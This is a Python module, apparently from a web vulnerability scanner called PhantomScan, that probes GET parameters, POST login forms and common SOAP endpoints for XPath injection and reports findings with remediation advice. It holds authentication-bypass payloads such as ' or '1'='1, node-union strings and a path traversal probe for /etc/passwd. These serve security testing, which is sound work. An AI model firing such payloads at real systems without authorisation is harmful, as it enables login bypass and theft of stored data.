"""
PhantomScan — XPath Injection Scanner
=======================================
Détecte les injections XPath dans les applications utilisant XML/SOAP/LDAP.

XPath Injection : analogue à SQLi mais pour les bases de données XML.
Permet de :
  - Bypasser l'authentification (//user[name/text()='' or '1'='1'])
  - Extraire le schéma XML complet (blind XPath avec SUBSTRING/STRING-LENGTH)
  - Lire des données sensibles de la structure XML

Techniques couvertes :
  1. Error-based  — messages d'erreur XPath dans la réponse
  2. Boolean-based — comportement différentiel TRUE vs FALSE
  3. Blind string extraction — SUBSTRING/STRING-LENGTH oracle

Cibles typiques :
  - Applications SOAP/WebServices
  - Portails de login avec backend XML
  - CMS utilisant XML comme BDD (eXist-DB, MarkLogic, BaseX)
  - APIs retournant du XML
"""

from __future__ import annotations

import asyncio
import re
from typing import AsyncIterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.scanner_mixin import ScannerMixin


# ── Payloads d'erreur XPath ───────────────────────────────────────────────────
_XPATH_ERROR_PAYLOADS = [
    ("'",                    "single quote"),
    ('"',                    "double quote"),
    ("' or '1'='1",          "OR 1=1 single"),
    ("\" or \"1\"=\"1",      "OR 1=1 double"),
    ("' or 1=1 or 'x'='",   "OR double boundary"),
    ("x' or name()='x",     "name() function"),
    ("']|//|['",             "Union-style"),
    ("' and count(/*)>0 and 'x'='x", "count children"),
    ("../../../etc/passwd",  "path traversal"),
    ("')] | //user | a[('", "node union"),
]

# ── Payloads Boolean TRUE vs FALSE ────────────────────────────────────────────
_XPATH_BOOL_TRUE  = "' or '1'='1"
_XPATH_BOOL_FALSE = "' or '1'='2"

# ── Patterns d'erreur XPath dans les réponses ─────────────────────────────────
_XPATH_ERROR_RE = re.compile(
    r"(?:xpath.*error|invalid.*xpath|unterminated string|"
    r"xpath.*exception|msxml.*error|libxml2.*error|"
    r"XPathException|XPathError|Invalid XPath|"
    r"XPathSyntaxException|javax\.xml\.xpath|"
    r"SimpleXMLElement|DOMXPath|"
    r"net\.sf\.saxon|org\.jaxen|"
    r"expected.*\].*got|unexpected.*token.*in.*xpath|"
    r"syntax error.*location|xmldb:query|eXist.*XQuery|"
    r"MarkLogic.*XDMP-LEXVAL)",
    re.I,
)

# ── Patterns XML dans les réponses (succès d'injection) ──────────────────────
_XML_LEAK_RE = re.compile(
    r"<(?:user|username|password|admin|role|account|login)[^>]*>",
    re.I,
)


class XPathInjectionScanner(ScannerMixin):
    """Scanner d'injection XPath."""

    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req = req
        self._heur = heuristic
        self._cfg = cfg
        self._found: set[str] = set()

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # Test params GET
        for param in list(params.keys()):
            if await self.should_skip(target, "GET", "xpath"):
                continue
            async for f in self._test_param_xpath(target, parsed, params, param):
                yield f
            await self.mark_tested(target, "GET", "xpath")

        # Test endpoints typiques SOAP/XML
        async for f in self._test_soap_endpoints(target):
            yield f

        # Test via le bus d'endpoints (formulaires POST)
        if self.bus:
            for ep in self.bus.filter_by_score(0.4):
                if ep.method in ("POST", "PUT") and ep.params:
                    async for f in self._test_post_xpath(ep.url, ep.params):
                        yield f

    # ── Error-based ───────────────────────────────────────────────────────────

    async def _test_param_xpath(
        self, target: str, parsed, params: dict, param: str
    ) -> AsyncIterator[Finding]:
        # Baseline
        baseline = await self._req.get(target)
        if baseline.error:
            return
        baseline_body = baseline.body or ""

        for payload, desc in _XPATH_ERROR_PAYLOADS[:6]:
            fuzzed = {**params, param: [payload]}
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            resp = await self._req.get(fuzz_url)
            if resp.error:
                continue

            body = resp.body or ""

            # Error-based : message d'erreur XPath
            m = _XPATH_ERROR_RE.search(body)
            if m and not _XPATH_ERROR_RE.search(baseline_body):
                if not self.sig_entropy_ok(m.group(0), body, min_entropy=2.5):
                    continue
                resp2 = await self.re_probe(fuzz_url)
                if resp2 and _XPATH_ERROR_RE.search(resp2.body or ""):
                    key = f"xpath_err:{param}"
                    if key not in self._found:
                        self._found.add(key)
                        yield Finding(
                            title=f"XPath Injection — Error-based · param `{param}`",
                            severity=Severity.HIGH,
                            url=fuzz_url,
                            module="vulns/xpath_injection",
                            description=(
                                f"Message d'erreur XPath détecté après injection dans `{param}`. "
                                f"Pattern: `{m.group(0)[:80]}`"
                            ),
                            evidence=f"Payload: {payload!r} | Error: {m.group(0)[:100]}",
                            cwe="CWE-643",
                            remediation=(
                                "Utiliser des XPath paramétrées (variables bindées). "
                                "Ne jamais concaténer les inputs dans les expressions XPath. "
                                "Valider et échapper les entrées via XPath literal encoder."
                            ),
                        )
                        return

            # XML data leakage suite à injection
            if _XML_LEAK_RE.search(body) and not _XML_LEAK_RE.search(baseline_body):
                key = f"xpath_leak:{param}"
                if key not in self._found:
                    self._found.add(key)
                    yield Finding(
                        title=f"XPath Injection — Data Leakage · param `{param}`",
                        severity=Severity.CRITICAL,
                        url=fuzz_url,
                        module="vulns/xpath_injection",
                        description=(
                            f"Structure XML sensible exposée après injection XPath dans `{param}`. "
                            "Des nœuds user/password/admin sont visibles dans la réponse."
                        ),
                        evidence=f"XML tags leaked: {_XML_LEAK_RE.findall(body)[:3]}",
                        cwe="CWE-643",
                        remediation="Utiliser des XPath paramétrées. Valider et encoder les entrées.",
                    )
                    return

    # ── Boolean-based ─────────────────────────────────────────────────────────

    async def _test_post_xpath(self, url: str, params: list) -> AsyncIterator[Finding]:
        """Test XPath sur formulaires POST (login typique)."""
        for param in params[:3]:
            for payload, desc in [
                (_XPATH_BOOL_TRUE, "TRUE"),
                (_XPATH_BOOL_FALSE, "FALSE"),
            ][:1]:  # Juste TRUE pour commencer
                resp = await self._req.send(ProbeRequest(
                    method="POST",
                    url=url,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body=urlencode({param: payload, "password": "anything"}),
                ))
                if resp.error:
                    continue

                body = resp.body or ""
                if _XPATH_ERROR_RE.search(body):
                    key = f"xpath_post:{url}:{param}"
                    if key not in self._found:
                        self._found.add(key)
                        yield Finding(
                            title=f"XPath Injection — POST form · param `{param}`",
                            severity=Severity.HIGH,
                            url=url,
                            module="vulns/xpath_injection",
                            description=(
                                f"XPath injection via formulaire POST, paramètre `{param}`. "
                                "Potentiel bypass d'authentification."
                            ),
                            evidence=f"Payload: {payload!r} | Error XPath in response",
                            cwe="CWE-643",
                            remediation="Utiliser des XPath paramétrées.",
                        )
                        return

    # ── SOAP endpoints ────────────────────────────────────────────────────────

    async def _test_soap_endpoints(self, target: str) -> AsyncIterator[Finding]:
        """Teste les endpoints SOAP typiques pour XPath injection."""
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        soap_paths = ["/ws", "/soap", "/api/soap", "/services", "/webservice", "/wsdl"]

        soap_probe = """<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <login><username>' or '1'='1</username><password>x</password></login>
  </soapenv:Body>
</soapenv:Envelope>"""

        for path in soap_paths:
            url = base + path
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                headers={
                    "Content-Type": "text/xml; charset=utf-8",
                    "SOAPAction": '""',
                },
                body=soap_probe,
            ))
            if resp.error or resp.status in (404, 405):
                continue

            body = resp.body or ""
            if _XPATH_ERROR_RE.search(body):
                key = f"xpath_soap:{url}"
                if key not in self._found:
                    self._found.add(key)
                    yield Finding(
                        title="XPath Injection via SOAP endpoint",
                        severity=Severity.HIGH,
                        url=url,
                        module="vulns/xpath_injection",
                        description=(
                            f"XPath injection détectée sur un endpoint SOAP : {url}. "
                            "Le payload XPath dans le body SOAP déclenche une erreur."
                        ),
                        evidence=f"HTTP {resp.status} | XPath error in SOAP response",
                        cwe="CWE-643",
                        remediation="Utiliser des XPath paramétrées dans tous les handlers SOAP.",
                    )
                    return
